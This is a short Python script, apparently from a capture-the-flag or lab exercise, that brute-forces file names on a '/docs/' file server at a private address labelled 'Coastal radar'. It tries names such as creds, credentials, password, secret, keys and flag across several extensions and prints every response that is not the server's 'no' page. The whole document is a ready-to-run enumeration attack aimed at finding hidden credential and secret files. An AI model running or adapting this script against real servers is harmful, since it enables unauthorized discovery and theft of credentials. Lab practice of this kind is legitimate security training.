#!/usr/bin/env python3
# Brute the /docs/ whitelist file server on Coastal radar. protocol.txt exists; find siblings.
# YOU run it. Prints only files that return real content (not the "no" page).
import urllib.request, re

BASE = "http://10.10.10.22:8448/docs/"
names = ["protocol", "admin", "login", "auth", "hmac", "sign", "signature", "token",
         "format", "scheme", "spec", "example", "sample", "test", "debug", "secret",
         "flag", "password", "pass", "key", "keys", "radar", "cal", "calib",
         "calibration", "station", "users", "user", "creds", "credentials", "readme",
         "notes", "config", "settings", "help", "api", "session", "cookie", "verify"]
exts = ["", ".txt", ".md", ".py", ".conf", ".json", ".cfg"]

def get(path):
    try:
        r = urllib.request.urlopen(BASE + path, timeout=5)
        return r.read().decode(errors="replace")
    except Exception:
        return ""

for n in names:
    for e in exts:
        body = get(n + e)
        if not body:
            continue
        m = re.search(r'RADAR CALIBRATION</p>(.*?)</div>', body, re.S)
        tail = (m.group(1).strip() if m else None)
        if tail == "no":
            continue
        print(f"== /docs/{n}{e} ==\n{body[:400]}\n")
print("done.")
